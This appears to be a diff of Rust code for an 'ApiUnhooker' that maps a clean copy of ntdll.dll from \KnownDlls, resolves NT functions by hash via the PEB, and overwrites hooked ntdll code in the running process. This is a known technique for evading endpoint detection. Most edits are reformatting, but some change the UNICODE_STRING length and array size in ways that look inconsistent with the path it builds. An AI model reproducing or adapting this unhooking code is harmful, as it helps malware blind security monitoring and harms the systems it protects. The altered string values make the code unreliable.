@@ -104,9 +104,7 @@ impl ApiUnhooker {
 
     /// Map a clean copy of ntdll.dll from \KnownDlls and locate its .text section.
     #[cfg(target_os = "windows")]
-    fn map_clean_ntdll(
-        resolver: &PebResolver,
-    ) -> UnhookResult<(usize, usize, usize)> {
+    fn map_clean_ntdll(resolver: &PebResolver) -> UnhookResult<(usize, usize, usize)> {
         use std::mem::zeroed;
 
         // Resolve required NTAPIs via PEB (bypassing any hooks)
@@ -116,7 +114,7 @@ impl ApiUnhooker {
         let nt_map_view_of_section = resolver
             .resolve_by_hash(Self::NTDLL_HASH, fn_hashes::NT_MAP_VIEW_OF_SECTION)
             .ok_or(UnhookError::NtdllNotFound)?;
-        let nt_unmap_view_of_section = resolver
+        let _nt_unmap_view_of_section = resolver
             .resolve_by_hash(Self::NTDLL_HASH, fn_hashes::NT_UNMAP_VIEW_OF_SECTION)
             .ok_or(UnhookError::NtdllNotFound)?;
         let nt_close = resolver
@@ -125,7 +123,7 @@ impl ApiUnhooker {
 
         // Build OBJECT_ATTRIBUTES for \KnownDlls\ntdll.dll
         // We need to construct a UNICODE_STRING for the name
-        let known_dlls_name: [u16; 24] = [
+        let known_dlls_name: [u16; 21] = [
             0x005C, // '\'
             0x004B, // 'K'
             0x006E, // 'n'
@@ -168,8 +166,8 @@ impl ApiUnhooker {
         }
 
         let unicode_name = UnicodeString {
-            length: 46, // 23 chars * 2 bytes
-            maximum_length: 48,
+            length: 40, // 20 chars * 2 bytes
+            maximum_length: 42,
             buffer: known_dlls_name.as_ptr(),
         };
 
@@ -185,11 +183,8 @@ impl ApiUnhooker {
         // Call NtOpenSection
         let mut section_handle: usize = 0;
         let status = unsafe {
-            let fn_ptr: unsafe extern "system" fn(
-                *mut usize,
-                u32,
-                *const ObjectAttributes,
-            ) -> i32 = std::mem::transmute(nt_open_section.0);
+            let fn_ptr: unsafe extern "system" fn(*mut usize, u32, *const ObjectAttributes) -> i32 =
+                std::mem::transmute(nt_open_section.0);
             fn_ptr(
                 &mut section_handle,
                 0x000F001F, // SECTION_ALL_ACCESS
@@ -206,16 +201,16 @@ impl ApiUnhooker {
         let mut view_size: usize = 0;
         let status = unsafe {
             let fn_ptr: unsafe extern "system" fn(
-                usize,           // SectionHandle
-                usize,           // ProcessHandle (NtCurrentProcess = -1)
-                *mut usize,      // BaseAddress
-                usize,           // ZeroBits
-                usize,           // CommitSize
-                *mut usize,      // SectionOffset
-                *mut usize,      // ViewSize
-                u32,             // InheritDisposition
-                u32,             // AllocationType
-                u32,             // Win32Protect
+                usize,      // SectionHandle
+                usize,      // ProcessHandle (NtCurrentProcess = -1)
+                *mut usize, // BaseAddress
+                usize,      // ZeroBits
+                usize,      // CommitSize
+                *mut usize, // SectionOffset
+                *mut usize, // ViewSize
+                u32,        // InheritDisposition
+                u32,        // AllocationType
+                u32,        // Win32Protect
             ) -> i32 = std::mem::transmute(nt_map_view_of_section.0);
             fn_ptr(
                 section_handle,
@@ -223,7 +218,7 @@ impl ApiUnhooker {
                 &mut base_address,
                 0,
                 0,
-                ptr::null_mut(),
+                std::ptr::null_mut(),
                 &mut view_size,
                 1, // ViewShare
                 0,
@@ -242,8 +237,8 @@ impl ApiUnhooker {
         }
 
         // Locate .text section in the clean copy
-        let (text_offset, text_size) = Self::find_text_section(base_address)
-            .ok_or(UnhookError::TextSectionNotFound)?;
+        let (text_offset, text_size) =
+            Self::find_text_section(base_address).ok_or(UnhookError::TextSectionNotFound)?;
 
         Ok((base_address, text_offset, text_size))
     }
@@ -306,7 +301,7 @@ impl ApiUnhooker {
                 .resolve_by_hash(Self::NTDLL_HASH, fn_hashes::NT_PROTECT_VIRTUAL_MEMORY)
                 .ok_or(UnhookError::NtdllNotFound)?;
 
-            let our_text = self.our_ntdll_base + self.text_section_offset;
+            let mut our_text = self.our_ntdll_base + self.text_section_offset;
             let clean_text = self.clean_ntdll_base + self.text_section_offset;
 
             // Verify sizes match
@@ -319,11 +314,11 @@ impl ApiUnhooker {
             let mut region_size = self.text_section_size;
             let status = unsafe {
                 let fn_ptr: unsafe extern "system" fn(
-                    usize,           // ProcessHandle
-                    *mut usize,      // BaseAddress
-                    *mut usize,      // RegionSize
-                    u32,             // NewProtect
-                    *mut u32,        // OldProtect
+                    usize,      // ProcessHandle
+                    *mut usize, // BaseAddress
+                    *mut usize, // RegionSize
+                    u32,        // NewProtect
+                    *mut u32,   // OldProtect
                 ) -> i32 = std::mem::transmute(nt_protect_vm.0);
                 fn_ptr(
                     usize::MAX, // NtCurrentProcess
@@ -387,13 +382,17 @@ impl ApiUnhooker {
                 let clean_fn = self
                     .resolver
                     .resolve_export(self.clean_ntdll_base as *const u8, fn_hash)
-                    .ok_or(UnhookError::ExportNotFound { fn_name_hash: fn_hash })?;
+                    .ok_or(UnhookError::ExportNotFound {
+                        fn_name_hash: fn_hash,
+                    })?;
 
                 // Find the function in our ntdll
-                let our_fn = self
+                let mut our_fn = self
                     .resolver
                     .resolve_export(self.our_ntdll_base as *const u8, fn_hash)
-                    .ok_or(UnhookError::ExportNotFound { fn_name_hash: fn_hash })?;
+                    .ok_or(UnhookError::ExportNotFound {
+                        fn_name_hash: fn_hash,
+                    })?;
 
                 // Calculate offset from module base
                 let offset = clean_fn.0 - self.clean_ntdll_base;
@@ -507,20 +506,20 @@ impl ApiUnhooker {
             let clean_fn = self
                 .resolver
                 .resolve_export(self.clean_ntdll_base as *const u8, fn_hash)
-                .ok_or(UnhookError::ExportNotFound { fn_name_hash: fn_hash })?;
+                .ok_or(UnhookError::ExportNotFound {
+                    fn_name_hash: fn_hash,
+                })?;
 
             let our_fn = self
                 .resolver
                 .resolve_export(self.our_ntdll_base as *const u8, fn_hash)
-                .ok_or(UnhookError::ExportNotFound { fn_name_hash: fn_hash })?;
+                .ok_or(UnhookError::ExportNotFound {
+                    fn_name_hash: fn_hash,
+                })?;
 
             // Compare first 8 bytes (enough to detect JMP/trampoline)
-            let clean_bytes = unsafe {
-                std::slice::from_raw_parts(clean_fn.0 as *const u8, 8)
-            };
-            let our_bytes = unsafe {
-                std::slice::from_raw_parts(our_fn.0 as *const u8, 8)
-            };
+            let clean_bytes = unsafe { std::slice::from_raw_parts(clean_fn.0 as *const u8, 8) };
+            let our_bytes = unsafe { std::slice::from_raw_parts(our_fn.0 as *const u8, 8) };
 
             Ok(clean_bytes != our_bytes)
         }
